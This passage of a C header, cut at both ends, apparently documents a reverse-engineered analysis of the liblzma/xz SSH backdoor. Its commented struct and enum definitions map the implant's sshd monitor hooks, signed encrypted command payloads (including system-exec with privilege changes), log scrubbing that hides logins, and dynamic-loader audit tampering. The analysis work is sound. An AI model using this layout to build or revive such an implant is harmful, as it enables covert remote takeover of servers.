typedef int (*pfn_setlogmask_t)(int mask);

typedef int (*pfn_shutdown_t)(int sockfd, int how);

/*
 * Resolved libc entrypoints used by the implant (pselect/read/write/setresgid/etc.) along with the book-keeping counters for how many symbols were patched successfully.
 */
typedef struct __attribute__((packed)) libc_imports {
 u32 resolved_imports_count; /* Incremented whenever a libc stub resolves; reaching the expected total gates later stages. */
 u32 reserved_imports_padding; /* Alignment padding before the function pointer block. */
 pfn_malloc_usable_size_t malloc_usable_size; /* Fake allocator stub returned by resolve_ldso_audit_offsets so liblzma callers can probe chunk sizes. */
 pfn_getuid_t getuid; /* Used when deciding whether payload commands should attempt privilege changes. */
 pfn_exit_t exit; /* Hard-exit path when hooks fail and sshd should terminate immediately. */
 pfn_setresgid_t setresgid; /* Applied by payload handlers before running `system()` commands. */
 pfn_setresuid_t setresuid; /* Companion to setresgid for privilege swaps. */
 pfn_system_t system; /* Executes decoded attacker commands (payload type 0x3). */
 pfn_write_t write; /* Socket write helper (e.g., feeding canned monitor replies). */
 pfn_pselect_t pselect; /* Used by the fd I/O helpers to mirror sshd's blocking behaviour. */
 pfn_read_t read; /* Read stub allocated during libc resolution so fd_read_full can avoid the PLT. */
 pfn___errno_location_t __errno_location; /* Provides thread-local errno access for the fd shims. */
 pfn_setlogmask_t setlogmask; /* Lets the implant silence syslog noise before patching. */
 pfn_shutdown_t shutdown; /* Allows hooks to close sockets cleanly when aborting connections. */
 void *__libc_stack_end; /* Snapshot of libc's __libc_stack_end so the fake allocator/import resolver can restore stack metadata. */
} libc_imports_t;

typedef int (*pfn_RSA_public_decrypt_t)(
 int flen, unsigned char *from, unsigned char *to,
 RSA *rsa, int padding);

typedef int (*pfn_EVP_PKEY_set1_RSA_t)(EVP_PKEY *pkey, struct rsa_st *key);

typedef void (*pfn_RSA_get0_key_t)(
 const RSA *r,
 const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);

typedef void (*pfn_DSA_get0_pqg_t)(
  const DSA *d, const BIGNUM **p,
  const BIGNUM **q, const BIGNUM **g);

typedef const BIGNUM *(*pfn_DSA_get0_pub_key_t)(const DSA *d);

typedef size_t (*pfn_EC_POINT_point2oct_t)(
  const EC_GROUP *group, const EC_POINT *p,
  point_conversion_form_t form, unsigned char *buf,
  size_t len, BN_CTX *ctx);

typedef EC_POINT *(*pfn_EC_KEY_get0_public_key_t)(const EC_KEY *key);

typedef const EC_GROUP *(*pfn_EC_KEY_get0_group_t)(const EC_KEY *key);

typedef EVP_MD *(*pfn_EVP_sha256_t)(void);

typedef int (*pfn_BN_num_bits_t)(const BIGNUM *a);

typedef EVP_PKEY *(*pfn_EVP_PKEY_new_raw_public_key_t)(
  int type, ENGINE *e,
  const unsigned char *key, size_t keylen);

typedef EVP_MD_CTX *(*pfn_EVP_MD_CTX_new_t)(void);

typedef int (*pfn_EVP_DigestVerifyInit_t)(
  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,
  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);

typedef int (*pfn_EVP_DigestVerify_t)(
  EVP_MD_CTX *ctx, const unsigned char *sig,
  size_t siglen, const unsigned char *tbs, size_t tbslen);

typedef void (*pfn_EVP_MD_CTX_free_t)(EVP_MD_CTX *ctx);

typedef void (*pfn_EVP_PKEY_free_t)(EVP_PKEY *key);

typedef EVP_CIPHER_CTX *(*pfn_EVP_CIPHER_CTX_new_t)(void);

typedef int (*pfn_EVP_DecryptInit_ex_t)(
  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,
  ENGINE *impl, const unsigned char *key, const unsigned char *iv);

typedef int (*pfn_EVP_DecryptUpdate_t)(
  EVP_CIPHER_CTX *ctx, unsigned char *out,
  int *outl, const unsigned char *in, int inl);

typedef int (*pfn_EVP_DecryptFinal_ex_t)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);

typedef void (*pfn_EVP_CIPHER_CTX_free_t)(EVP_CIPHER_CTX *ctx);

typedef const EVP_CIPHER *(*pfn_EVP_chacha20_t)(void);

typedef RSA *(*pfn_RSA_new_t)(void);

typedef BIGNUM *(*pfn_BN_dup_t)(const BIGNUM *from);

typedef BIGNUM *(*pfn_BN_bin2bn_t)(const unsigned char *s, int len, BIGNUM *ret);

typedef int (*pfn_RSA_set0_key_t)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);

typedef int (*pfn_EVP_Digest_t)(
  const void *data, size_t count, unsigned char *md,
  unsigned int *size, const EVP_MD *type, ENGINE *impl);

typedef int (*pfn_RSA_sign_t)(
  int type,
  const unsigned char *m, unsigned int m_len,
  unsigned char *sigret, unsigned int *siglen, RSA *rsa);

typedef int (*pfn_BN_bn2bin_t)(const BIGNUM *a, unsigned char *to);

typedef void (*pfn_RSA_free_t)(RSA *rsa);

typedef void (*pfn_BN_free_t)(BIGNUM *a);

/*
 * All non-libc function pointers the payload needs (RSA/EVP/BN helpers, chacha decrypt, etc.) plus access to the owning `libc_imports_t` so callers can reach both sets via one pointer.
 */
typedef struct __attribute__((packed)) imported_funcs {
 pfn_RSA_public_decrypt_t RSA_public_decrypt_orig; /* Saved pointer to the genuine RSA_public_decrypt implementation. */
 pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA_orig; /* Original EVP_PKEY_set1_RSA before hooks attach. */
 pfn_RSA_get0_key_t RSA_get0_key_orig; /* Original RSA_get0_key before hooks attach. */
 pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt; /* sshd’s PLT slot; populated when the loader finds the GOT entry. */
 pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt; /* sshd’s PLT slot for EVP_PKEY_set1_RSA. */
 pfn_RSA_get0_key_t *RSA_get0_key_plt; /* sshd’s PLT slot for RSA_get0_key (used for fallback jumps). */
 pfn_DSA_get0_pqg_t DSA_get0_pqg; /* DSA helpers used while hashing/serialising host keys. */
 pfn_DSA_get0_pub_key_t DSA_get0_pub_key;
 pfn_EC_POINT_point2oct_t EC_POINT_point2oct;
 pfn_EC_KEY_get0_public_key_t EC_KEY_get0_public_key;
 pfn_EC_KEY_get0_group_t EC_KEY_get0_group;
 pfn_EVP_sha256_t EVP_sha256; /* Hash primitive consumed by rsa/dsa key hashers. */
 pfn_RSA_get0_key_t RSA_get0_key_resolved; /* Direct pointer into libcrypto (bypassing PLT) for payload parsing. */
 pfn_BN_num_bits_t BN_num_bits;
 pfn_EVP_PKEY_new_raw_public_key_t EVP_PKEY_new_raw_public_key;
 pfn_EVP_MD_CTX_new_t EVP_MD_CTX_new;
 pfn_EVP_DigestVerifyInit_t EVP_DigestVerifyInit;
 pfn_EVP_DigestVerify_t EVP_DigestVerify;
 pfn_EVP_MD_CTX_free_t EVP_MD_CTX_free;
 pfn_EVP_PKEY_free_t EVP_PKEY_free;
 pfn_EVP_CIPHER_CTX_new_t EVP_CIPHER_CTX_new;
 pfn_EVP_DecryptInit_ex_t EVP_DecryptInit_ex;
 pfn_EVP_DecryptUpdate_t EVP_DecryptUpdate;
 pfn_EVP_DecryptFinal_ex_t EVP_DecryptFinal_ex;
 pfn_EVP_CIPHER_CTX_free_t EVP_CIPHER_CTX_free;
 pfn_EVP_chacha20_t EVP_chacha20; /* ChaCha primitive used to decrypt payload bodies. */
 pfn_RSA_new_t RSA_new;
 pfn_BN_dup_t BN_dup;
 pfn_BN_bin2bn_t BN_bin2bn;
 pfn_RSA_set0_key_t RSA_set0_key;
 pfn_EVP_Digest_t EVP_Digest;
 pfn_RSA_sign_t RSA_sign;
 pfn_BN_bn2bin_t BN_bn2bin;
 pfn_RSA_free_t RSA_free;
 pfn_BN_free_t BN_free;
 libc_imports_t *libc; /* Back-pointer so RSA/MM hooks can reach libc shims. */
 u32 resolved_imports_count; /* Number of successfully resolved libcrypto symbols (init expects 0x1d). */
 u32 reserved_imports_padding; /* Alignment padding after the count. */
} imported_funcs_t;

struct ssh;

struct sshbuf;

typedef struct ssh ssh;

typedef struct sshbuf sshbuf;

typedef int (*sshd_monitor_func_t)(struct ssh *ssh, int sock, struct sshbuf *m);

typedef enum monitor_reqtype {
 /* Mirror of OpenSSH monitor IPC opcodes (even = request, odd = answer). */
 MONITOR_REQ_MODULI = 0,
 MONITOR_ANS_MODULI = 1,
 MONITOR_REQ_FREE = 2,
 MONITOR_REQ_AUTHSERV = 4,
 MONITOR_REQ_SIGN = 6,
 MONITOR_ANS_SIGN = 7,
 MONITOR_REQ_PWNAM = 8,
 MONITOR_ANS_PWNAM = 9,
 MONITOR_REQ_AUTH2_READ_BANNER = 10,
 MONITOR_ANS_AUTH2_READ_BANNER = 11,
 MONITOR_REQ_AUTHPASSWORD = 12,
 MONITOR_ANS_AUTHPASSWORD = 13,
 MONITOR_REQ_BSDAUTHQUERY = 14,
 MONITOR_ANS_BSDAUTHQUERY = 15,
 MONITOR_REQ_BSDAUTHRESPOND = 16,
 MONITOR_ANS_BSDAUTHRESPOND = 17,
 MONITOR_REQ_KEYALLOWED = 22,
 MONITOR_ANS_KEYALLOWED = 23,
 MONITOR_REQ_KEYVERIFY = 24,
 MONITOR_ANS_KEYVERIFY = 25,
 MONITOR_REQ_KEYEXPORT = 26,
 MONITOR_REQ_PTY = 28,
 MONITOR_ANS_PTY = 29,
 MONITOR_REQ_PTYCLEANUP = 30,
 MONITOR_REQ_SESSKEY = 32,
 MONITOR_ANS_SESSKEY = 33,
 MONITOR_REQ_SESSID = 34,
 MONITOR_REQ_RSAKEYALLOWED = 36,
 MONITOR_ANS_RSAKEYALLOWED = 37,
 MONITOR_REQ_RSACHALLENGE = 38,
 MONITOR_ANS_RSACHALLENGE = 39,
 MONITOR_REQ_RSARESPONSE = 40,
 MONITOR_ANS_RSARESPONSE = 41,
 MONITOR_REQ_GSSSETUP = 42,
 MONITOR_ANS_GSSSETUP = 43,
 MONITOR_REQ_GSSSTEP = 44,
 MONITOR_ANS_GSSSTEP = 45,
 MONITOR_REQ_GSSUSEROK = 46,
 MONITOR_ANS_GSSUSEROK = 47,
 MONITOR_REQ_GSSCHECKMIC = 48,
 MONITOR_ANS_GSSCHECKMIC = 49,
 MONITOR_REQ_TERM = 50,
 MONITOR_REQ_PAM_START = 100,
 MONITOR_REQ_PAM_ACCOUNT = 102,
 MONITOR_ANS_PAM_ACCOUNT = 103,
 MONITOR_REQ_PAM_INIT_CTX = 104,
 MONITOR_ANS_PAM_INIT_CTX = 105,
 MONITOR_REQ_PAM_QUERY = 106,
 MONITOR_ANS_PAM_QUERY = 107,
 MONITOR_REQ_PAM_RESPOND = 108,
 MONITOR_ANS_PAM_RESPOND = 109,
 MONITOR_REQ_PAM_FREE_CTX = 110,
 MONITOR_ANS_PAM_FREE_CTX = 111,
 MONITOR_REQ_AUDIT_EVENT = 112,
 MONITOR_REQ_AUDIT_COMMAND = 113,
} monitor_reqtype;

typedef enum monitor_reqtype monitor_reqtype_t;

typedef enum payload_command_type {
 PAYLOAD_COMMAND_STASH_AUTHPASSWORD = 0x1, /* Queue an mm_answer_authpassword payload for later use. */
 PAYLOAD_COMMAND_KEYVERIFY_REPLY = 0x2, /* Carry a canned mm_answer_keyverify payload that the hook writes back. */
 PAYLOAD_COMMAND_SYSTEM_EXEC = 0x3 /* Request privilege escalation and exec() via libc. */
} payload_command_type;

typedef u8 payload_command_type_t;

/*
 * Decrypted command blob staged by `mm_answer_keyallowed`: starts with a length, 0x3a-byte signed header (ending in the payload type), a 0x72-byte Ed448 signature, and then the attacker-controlled body beginning at offset 0xae with a caller-supplied payload_data_offset.
 */
typedef struct __attribute__((packed)) sshd_payload_ctx {
 u16 payload_total_size; /* Total decrypted payload length (header + trailer + body). */
 u8 signed_header_prefix[0x39]; /* First 0x39 bytes of header metadata that the Ed448 signature covers. */
 payload_command_type_t command_type; /* PAYLOAD_COMMAND_STASH_AUTHPASSWORD => stash authpayload, PAYLOAD_COMMAND_KEYVERIFY_REPLY => canned reply, PAYLOAD_COMMAND_SYSTEM_EXEC => system/elevate command. */
 u8 ed448_signature[0x72];
 u16 body_payload_offset; /* Offset into `payload_body` where the attacker-supplied command stream begins. */
 u8 payload_body[]; /* Decrypted body (begins at offset 0xae of the blob, includes padding + command bytes). */
} sshd_payload_ctx_t;

/*
 * Snapshot of the sshd monitor state that tracks where each `mm_answer_*` handler lives, whether it has already been hooked, and which request IDs correspond to the sensitive operations we intercept.
 */
typedef struct __attribute__((packed)) sshd_ctx {
 BOOL have_mm_answer_keyallowed; /* mm_answer_keyallowed located and hook slot writable. */
 BOOL have_mm_answer_authpassword; /* mm_answer_authpassword located and hook slot writable. */
 BOOL have_mm_answer_keyverify; /* mm_answer_keyverify located and hook slot writable. */
 u8 hook_flags_padding[4];
 sshd_monitor_func_t mm_answer_authpassword_send_reply_hook; /* Hook entry installed for MONITOR_REQ_AUTHPASSWORD. */
 sshd_monitor_func_t mm_answer_keyallowed_payload_dispatch_hook; /* Hook entry that runs the payload state machine. */
 sshd_monitor_func_t mm_answer_keyverify_send_staged_reply_hook; /* Hook entry that replies to keyverify without sshd. */
 sshd_monitor_func_t *mm_answer_authpassword_start; /* Original mm_answer_authpassword() start in sshd. */
 void *mm_answer_authpassword_end; /* Original mm_answer_authpassword() end address (scan bound). */
 sshd_monitor_func_t *mm_answer_authpassword_slot; /* Pointer to monitor_dispatch[authpassword] slot. */
 monitor_reqtype_t monitor_reqtype_authpassword; /* MONITOR_REQ_* code used for authpassword replies. */
 u8 authpassword_padding[4];
 sshd_monitor_func_t *mm_answer_keyallowed_start; /* Original mm_answer_keyallowed() start in sshd. */
 void *mm_answer_keyallowed_end; /* Original mm_answer_keyallowed() end address (scan bound). */
 sshd_monitor_func_t *mm_answer_keyallowed_slot; /* Pointer to monitor_dispatch[keyallowed] slot. */
 monitor_reqtype_t mm_answer_keyallowed_reqtype; /* MONITOR_REQ_* code used for keyallowed requests. */
 u8 keyallowed_padding[4];
 sshd_monitor_func_t *mm_answer_keyverify_start; /* Original mm_answer_keyverify() start in sshd. */
 void *mm_answer_keyverify_end; /* Original mm_answer_keyverify() end address (scan bound). */
 sshd_monitor_func_t *mm_answer_keyverify_slot; /* Pointer to monitor_dispatch[keyverify] slot. */
 u8 keyverify_padding[4];
 u16 keyverify_reply_len; /* Length of canned mm_answer_keyverify reply staged by payload. */
 u8 keyverify_reply_padding[2];
 u8 *keyverify_reply_buf; /* Buffer for canned mm_answer_keyverify reply. */
 u16 pending_authpayload_len; /* Length of pending mm_answer_authpassword payload body. */
 u8 pending_authpayload_padding[6];
 sshd_payload_ctx_t *pending_authpayload; /* Queued authpassword body consumed by the authpassword hook. */
 char *auth_log_fmt_reloc; /* Relocation for EncodedStringId 0x198 used to fingerprint the auth handlers. */
 void *mm_request_send_start; /* monitor mm_request_send() start in sshd. */
 void *mm_request_send_end; /* monitor mm_request_send() end in sshd. */
 u32 auth_root_allowed_flag; /* Set when PermitRootLogin uses a standalone global flag (vs. a struct field). */
 u32 sshd_ctx_reserved;
 int *use_pam_ptr; /* Pointer to sshd's `use_pam` global. */
 int *permit_root_login_ptr; /* Pointer to sshd's `permit_root_login` global. */
 char *STR_without_password; /* "without-password" string in sshd rodata. */
 char *STR_publickey; /* "publickey" string in sshd rodata. */
} sshd_ctx_t;

/*
 * Mirror of sshd’s syslog verbosity levels so the hook can translate its own severity decisions into whatever the daemon expects.
 */
typedef enum {
 SYSLOG_LEVEL_QUIET,
 SYSLOG_LEVEL_FATAL,
 SYSLOG_LEVEL_ERROR,
 SYSLOG_LEVEL_INFO,
 SYSLOG_LEVEL_VERBOSE,
 SYSLOG_LEVEL_DEBUG1,
 SYSLOG_LEVEL_DEBUG2,
 SYSLOG_LEVEL_DEBUG3,
 SYSLOG_LEVEL_NOT_SET = -1
} LogLevel;

typedef void (*log_handler_fn)(
 LogLevel level,
 int forced,
 const char *msg,
 void *ctx);

typedef void (*mm_log_handler_fn)(LogLevel level, int forced, const char *msg, void *ctx);

/*
 * Tracks the validated log_handler/log_handler_ctx slots, saved originals, syslog mask toggle, and the rodata/sshlogv pointers needed to rewrite sshd log lines safely.
 */
typedef struct __attribute__((packed)) sshd_log_ctx {
 BOOL log_squelched; /* When TRUE the hook bails immediately (used to silence logging after setup or once a rewrite ran). */
 BOOL handler_slots_valid; /* Loader verified the handler/context qword locations are safe to patch. */
 BOOL syslog_mask_applied; /* Payload requested syslog suppression; hook temporarily toggles setlogmask around rewrites. */
 u8 reserved_alignment[4]; /* Padding/alignment between booleans and pointers. */
 char *fmt_percent_s; /* "%s" literal pulled from sshd rodata for rebuilding sanitized lines. */
 char *str_connection_closed_by; /* "Connection closed by" fragment used when scrubbing preauth disconnects. */
 char *str_preauth; /* "(preauth)" suffix for the rewritten disconnect message. */
 char *str_authenticating; /* "Authenticating" label preceding the reconstructed username/host. */
 char *str_user; /* "user" label inserted before the redacted username. */
 log_handler_fn *log_handler_slot; /* Address of sshd's global log_handler function pointer. */
 void **log_handler_ctx_slot; /* Address of the companion log_handler_ctx pointer. */
 log_handler_fn saved_log_handler; /* Original handler captured before installing mm_log_handler_hide_auth_success_hook. */
 void *saved_log_handler_ctx; /* Original log handler context value (may be NULL). */
 void *sshlogv_impl; /* Direct pointer to sshlogv for emitting sanitized messages without libc wrappers. */
 mm_log_handler_fn log_hook_entry; /* Hook trampoline we patch into sshd's handler slot. */
} sshd_log_ctx_t;

/*
 * Compressed description of the monitor→kex layout used by sshd_find_forged_modulus_sshbuf: kex_sshbuf_qword_index selects the qword inside `struct kex` that is treated as a candidate `sshbuf *`, while monitor_pkex_table_dword_index selects the dword slot inside `struct monitor` that points at the active `kex **` pointer.
 */
typedef union __attribute__((packed)) sshd_offsets_kex {
 struct __attribute__((packed)) {
  sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */
  sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */
 } bytes;
 u16 raw_value;
} sshd_offsets_kex_t;

/*
 * Same idea as `sshd_offsets_kex_t` but for the sshbuf backing storage; stores the indices of the data pointer and size field we need to rewrite.
 */
typedef union __attribute__((packed)) sshd_offsets_sshbuf {
 struct __attribute__((packed)) {
  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */
  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */
 } bytes;
 u16 raw_value;
} sshd_offsets_sshbuf_t;

/*
 * Convenience wrapper that groups the individual offset unions for simultaneous propagation from the scanning routines into the runtime context.
 */
typedef struct __attribute__((packed)) sshd_offsets_fields {
 sshd_offsets_kex_t kex;
 sshd_offsets_sshbuf_t sshbuf;
} sshd_offsets_fields_t;

/*
 * 32-bit union that packs the discovered offsets and exposes them both as structured fields and as a raw integer when we need atomic updates.
 */
typedef union __attribute__((packed)) sshd_offsets {
 sshd_offsets_fields_t fields; /* Structured view: {kex, sshbuf} sub-unions. */
 struct __attribute__((packed)) {
  sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */
  sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */
  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */
  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */
 } bytes;
 u32 raw_value; /* Little-endian packed bytes: {kex_sshbuf_qword_index, monitor_pkex_table_dword_index, sshbuf_data_qword_index, sshbuf_size_qword_index}. */
} sshd_offsets_t;

/*
 * Tiny wrapper around the zero-based host_pubkeys[] ordinal used while iterating sshd host keys; keeping it as a named struct stops Ghidra from emitting anonymous unions whenever we compare or store the raw index.
 */
typedef struct __attribute__((packed)) sshd_hostkey_index {
 u32 raw_value; /* Zero-based index into `ctx->sshd_sensitive_data->host_pubkeys` for whichever key validated the Ed448 signature. */
} sshd_hostkey_index_t;

typedef enum {
 PAYLOAD_STREAM_EXPECT_HEADER = 0, /* State zero: staging buffer must stay below 0xae bytes until the signed header decrypts and the Ed448 check succeeds. */
 PAYLOAD_STREAM_BUFFERING_BODY = 1, /* Header verified; continue appending ChaCha-decrypted body chunks until the advertised payload_total_size is satisfied. */
 PAYLOAD_STREAM_BUFFERING_TRAILER = 2, /* Reserved continuation stage (treated equivalently to state 1 by payload_stream_validate_or_poison for older payload builders). */
 PAYLOAD_STREAM_COMMAND_READY = 3, /* Entire signed payload assembled and verified; mm_answer_keyallowed may now interpret the decrypted command. */
 PAYLOAD_STREAM_DISPATCHED = 4, /* Command handlers already consumed the payload—new chunks are ignored until the buffer resets. */
 PAYLOAD_STREAM_POISONED = 0xffffffff /* Fatal validation error; callers must discard any staged ciphertext and restart at state zero. */
} payload_stream_state_t;

/*
 * Authoritative runtime state for the backdoor: resolved libc/libcrypto imports, sshd monitor/log metadata, code/data bounds for scans, payload streaming buffers/state, and the secret-data attestation flags so every hook can share consistent context.
 */
typedef struct __attribute__((packed)) global_context {
 BOOL uses_endbr64; /* sshd uses ENDBR64 prologues (CET); gates relocation validation. */
 u32 uses_endbr64_padding; /* Alignment padding. */
 imported_funcs_t *imported_funcs; /* Resolved libcrypto helpers (RSA/BN/ChaCha/etc.) sourced from hooks_data. */
 libc_imports_t *libc_imports; /* Resolved libc syscalls (read/write/pselect/exit) used by the hooks. */
 BOOL disable_backdoor; /* When TRUE, hooks bail out to the original OpenSSL/sshd logic. */
 u32 disable_backdoor_padding; /* Alignment padding. */
 sshd_ctx_t *sshd_ctx; /* sshd hook state (mm handler addresses, request types, monitor offsets). */
 sensitive_data *sshd_sensitive_data; /* Captured sshd secrets/hostkeys table produced by the recon scans. */
 sshd_log_ctx_t *sshd_log_ctx; /* Bookkeeping for the mm_log_handler shim. */
 char *ssh_rsa_cert_alg; /* Pointer to "ssh-rsa-cert-v01@openssh.com" string inside sshd (modulus carving). */
 char *rsa_sha2_256_alg; /* Pointer to "rsa-sha2-256" string inside sshd (modulus carving). */
 monitor **monitor_struct_slot; /* BSS slot holding the active monitor* pointer discovered via xref voting. */
 u32 exit_flag; /* If set, keyallowed hook will exit(0) after payload handling. */
 sshd_offsets_t sshd_offsets; /* Packed indexes into monitor/kex/sshbuf fields for socket/payload lookups. */
 void *sshd_text_start; /* Bounds of sshd .text used by pattern searches and secret-data scanners. */
 void *sshd_text_end;
 void *sshd_data_start; /* Bounds of sshd .data/.bss used while hunting monitor globals. */
 void *sshd_data_end;
 void *sshd_main_entry; /* Resolved sshd main() pointer (and CET ENDBR check anchor). */
 void *liblzma_text_start; /* Bounds of liblzma code segment that houses the hook blob. */
 void *liblzma_text_end;
 u32 caller_uid; /* getuid() snapshot used to gate PAM/log overrides. */
 u32 caller_uid_padding; /* Alignment padding. */
 u64 sock_read_len; /* Bytes staged from the monitor socket for the pending payload. */
 u8 sock_read_buf[64]; /* Scratch buffer holding the staged payload tail read from keyallowed. */
 u64 payload_buffer_size; /* Total size of the signed payload buffer resident in hooks_data. */
 u64 payload_bytes_buffered; /* Number of payload bytes currently assembled into payload_buffer. */
 u8 *payload_buffer; /* Pointer to the shared payload scratch (hooks_data->signed_data). */
 sshd_payload_ctx_t *payload_ctx; /* Parsed payload header/context produced by keyallowed hook. */
 u32 sshd_host_pubkey_idx; /* Hostkey slot that verified the Ed448 signature. */
 payload_stream_state_t payload_state; /* Streaming state machine enforced by payload_stream_validate_or_poison. */
 u8 encrypted_secret_data[57]; /* ChaCha-encrypted secret blob; decrypted by secret_data_decrypt_with_embedded_seed. */
 u8 shift_operation_flags[31]; /* Per-operation guard bits so secret_data_append_* runs each attestation once. */
 u32 secret_bits_filled; /* Total bits shifted into the secret_data buffer so far. */
 u32 secret_data_padding; /* Alignment padding. */
} global_context_t;

/*
 * Tiny structure that stage-one drops into `.bss` so later stages can find the `global_context_t`, the active hooks, and the exported helper thunks without re-scanning memory.
 */
typedef struct __attribute__((packed)) backdoor_shared_globals {
 sshd_monitor_func_t authpassword_hook_entry; /* Jump target stage one publishes so later stages can patch mm_answer_authpassword(). */
 pfn_EVP_PKEY_set1_RSA_t evp_set1_rsa_hook_entry; /* Exported EVP hook trampoline shared between setup and the RSA key handlers. */
 global_context_t **global_ctx_slot; /* Pointer to the loader-owned `global_ctx` pointer so freshly installed hooks can find the singleton state. */
} backdoor_shared_globals_t;

/*
 * All of the state we steal from the dynamic loader when we patch the audit interfaces: pointers to `_dl_audit_symbind_alt`, link-map fields, cached audit bitmasks, and copies of the hooked GOT entries.
 */
typedef struct __attribute__((packed)) ldso_ctx {
 u8 libcrypto_basename_buf[0x40]; /* Scratch buffer holding libcrypto's basename; used while forging link_map::l_name for audit hooks. */
 u32 *libcrypto_auditstate_bindflags_ptr;
 u32 libcrypto_auditstate_bindflags_old_value;
 u8 _unknown1476[0x4];
 u32 *sshd_auditstate_bindflags_ptr;
 u32 sshd_auditstate_bindflags_old_value;
 u8 _unknown1493[0x4];
 void* sshd_link_map_l_audit_any_plt_addr;
 u8 link_map_l_audit_any_plt_bitmask;
 u8 _unknown1510[0x7];
 struct audit_ifaces **_dl_audit_ptr;
 unsigned int *_dl_naudit_ptr;
 struct audit_ifaces hooked_audit_ifaces;
 u8 _unknown1538[0x30];
 char **libcrypto_l_name;
 dl_audit_symbind_alt_fn _dl_audit_symbind_alt;
 size_t _dl_audit_symbind_alt__size;
 pfn_RSA_public_decrypt_t rsa_public_decrypt_backdoor_shim;
 pfn_EVP_PKEY_set1_RSA_t evp_pkey_set1_rsa_backdoor_shim;
 pfn_RSA_get0_key_t rsa_get0_key_backdoor_shim;
 imported_funcs_t *imported_funcs;
 u64 hooks_installed;
} ldso_ctx_t;

/*
 * Blob that actually lives inside liblzma’s data segment and holds the loader context (`ldso_ctx_t`), `global_context_t`, resolved imports, sshd/log contexts, and the signed payload bytes the implant enforces.
 */
typedef struct __attribute__((packed)) backdoor_hooks_data {
 ldso_ctx_t ldso_ctx; /* Snapshot of ld.so state (audit tables, hook trampolines, import pointers) that we install into liblzma. */
 global_context_t global_ctx; /* Runtime configuration shared between hooks (payload buffers, sshd metadata, shift cursors, etc.). */
 imported_funcs_t imported_funcs; /* Copy of the resolved libcrypto/libc entry points we patch so hooks can call the originals. */
 sshd_ctx_t sshd_ctx; /* Captured sshd function pointers/state used by the key hooks. */
 libc_imports_t libc_imports; /* Writable mirror of the libc imports resolved during setup. */
 sshd_log_ctx_t sshd_log_ctx; /* Book-keeping for the mm_log_handler shim (toggle + buffer). */
 u64 signed_data_size; /* Length in bytes of the attacker-signed payload that trails this struct. */
 u8 signed_data; /* First byte of the signed payload blob; rest of the bytes follow immediately in memory. */
} backdoor_hooks_data_t;

/*
 * Ephemeral orchestrator that stage one reuses while replaying the GOT patches: `hooks_data_slot_ptr` hands back liblzma’s resident blob, the symbind/RSA/mm_* entries point at the trampolines we splice into sshd, and the scratch/placeholder slots keep the structure ABI stable between bootstrap attempts.
 */
typedef struct __attribute__((packed)) backdoor_hooks_ctx {
 u8 bootstrap_scratch[0x30]; /* Zeroed on every init attempt; doubles as throwaway storage while we copy the ctx around during bootstrap. */
 backdoor_shared_globals_t *shared_globals_ptr; /* Pointer to the `backdoor_shared_globals_t` shim; stays NULL until init_backdoor_shared_globals publishes the shared block. */
 backdoor_hooks_data_t **hooks_data_slot_ptr; /* Address of liblzma’s global hooks_data pointer so stage two can pull the persistent blob/documented contexts out of `.bss`. */
 audit_symbind64_fn symbind64_trampoline; /* Backdoor symbind trampoline installed into ld.so’s audit vector (backdoor_symbind64). */
 pfn_RSA_public_decrypt_t rsa_public_decrypt_entry; /* RSA_public_decrypt replacement pushed into sshd’s PLT. */
 pfn_RSA_get0_key_t rsa_get0_key_entry; /* RSA_get0_key replacement pushed into sshd’s PLT. */
 mm_log_handler_fn mm_log_handler_entry; /* mm_log_handler shim we install when hooking sshd. */
 void *mm_log_handler_ctx_slot; /* Reserved slot for the log-hook context pointer (currently unused but keeps the struct layout stable). */
 u64 bootstrap_state_flags; /* Scratch flags touched by hooks_ctx_init_or_wait_for_shared_globals (set to 0x4 during bootstrap retries). */
 sshd_monitor_func_t mm_answer_keyallowed_entry; /* mm_answer_keyallowed hook entry point. */
 sshd_monitor_func_t mm_answer_keyverify_entry; /* mm_answer_keyverify hook entry point. */
 void *pending_monitor_hook; /* Placeholder for future monitor-hook trampolines (never populated in this build). */
} backdoor_hooks_ctx_t;

/*
 * Argument bundle handed to `backdoor_install_runtime_hooks`: zeroed scratch + the shared-globals pointer, hook context, dummy lzma_check_state, and the active `elf_entry_ctx_t` describing the hijacked cpuid GOT slot.
 */
typedef struct __attribute__((packed)) backdoor_setup_params {
 u8 bootstrap_padding[0x8]; /* Scratch bytes stage two zeroes while stack-allocating the struct; keeps the later pointers aligned and doubles as the memset target. */
 backdoor_shared_globals_t *shared_globals; /* Pointer to the published `backdoor_shared_globals_t` block (authpassword hook entry, EVP hook entry, global_ctx slot). */
 backdoor_hooks_ctx_t *hook_ctx; /* Active hook descriptor produced by hooks_ctx_init_or_wait_for_shared_globals (contains the mm/RSA trampolines and hooks_data slot). */
 lzma_check_state dummy_check_state; /* Throwaway check_state initialised with lzma_check_init so stage two can satisfy the API while building the params. */
 elf_entry_ctx_t *entry_ctx; /* Captured GOT/stack metadata for the currently hijacked cpuid thunk. */
} backdoor_setup_params_t;

/*
 * Pointers to the parsed ELF descriptors for sshd, ld.so, libc, liblzma, and libcrypto so helpers can share metadata without re-parsing each image.
 */
typedef struct __attribute__((packed)) elf_handles {
 elf_info_t *sshd; /* Parsed ELF metadata for sshd's main binary (the head of r_debug->r_map). */
